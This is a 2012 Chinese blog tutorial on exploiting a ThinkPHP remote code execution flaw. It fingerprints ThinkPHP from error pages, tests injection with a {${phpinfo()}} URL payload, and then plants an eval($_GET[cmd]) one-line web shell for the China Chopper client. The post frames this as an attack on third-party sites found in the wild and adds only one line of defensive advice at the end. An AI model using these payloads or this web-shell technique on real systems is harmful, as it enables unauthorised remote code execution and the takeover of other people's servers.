title: "ThinkPHP远程执行漏洞利用"
id: 109
date: 2012-07-06 00:56:10
tags: 
- thinkPHP漏洞
categories: 
- 原创作品
- 技术文章
---

睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。

先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：

>http://www.creturn.com/index.php/news/view/1

分析下这个url

>http://www.creturn.com/index.php  这个是入口

>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。

还是事例来进行演示：

先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架

据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。

在存在漏洞的页面中输入:www.creturn.com/index.php/fuck
<!--more-->
好吧，为什么是fuck？前面已经说了第一个参数是模块那么系统肯定找不到模块的，所以出错信息：

[![](http://www.creturn.com/asset/uploads/2012/07/think1.png "think1")](http://www.creturn.com/asset/uploads/2012/07/think1.png)

可以看到是thinkPHP框架

那么测试一下站点是否存在远程执行漏洞。

注意你的参数不要远程执行命令不能直接卸载index.php 后面的两个参数，最少要是第三个，前面已经说了第一个参数是模块，第二个参数是是方法。而从第三个开始是参数，因为此漏洞就是对参数过滤不严格并且导致可执行远程命令

找到一个这样的连接:

>http://www.creturn.com/index.php/article/show/id/116

很明显可以看到他id后面跟的一个116.用漏洞命令替换它看看是否存在漏洞

远程执行命令参数{${PHP代码}}，替换后就是：

>http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}  加一个PHP的探针

测试下看是否能够执行此命令：

[![](http://www.creturn.com/asset/uploads/2012/07/think2.png "think2")](http://www.creturn.com/asset/uploads/2012/07/think2.png)

可以看到已经解析了。那么就证明此站点存在远程执行漏洞，那么我们可以直接写入菜刀的一句话：

一句话命令：{${eval($_GET[cmd])}} 替换之前的命令然后用菜刀连接

>地址为：http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}

菜刀连接看下效果：

[![](http://www.creturn.com/asset/uploads/2012/07/think3.png "think3")](http://www.creturn.com/asset/uploads/2012/07/think3.png)

好吧，就到这里。上面的真实地址我都替换掉了，目的只是演示thinkPHP远程执行命令的方法。还有就是提醒各位使用thinkphp框架的朋友，开发完东西后记住把debug模式关掉要不然很容以就看出是thinkphp的框架。
